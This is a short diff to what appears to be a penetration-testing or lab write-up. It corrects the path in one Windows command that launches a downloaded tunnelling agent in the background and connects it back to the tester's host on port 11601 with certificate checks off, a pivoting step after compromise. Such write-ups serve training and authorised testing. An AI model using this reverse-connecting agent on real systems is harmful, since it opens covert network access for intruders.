@@ -3,4 +3,4 @@ Then we download the correct Windows Agent binary from: https://github.com/nicoc
 
 Then we transfer the agent.exe binary to the machine and execute:
 
-start /b \agent.exe -connect <LOCALIP>:11601 -ignore-cert
+start /b .\agent.exe -connect <LOCALIP>:11601 -ignore-cert
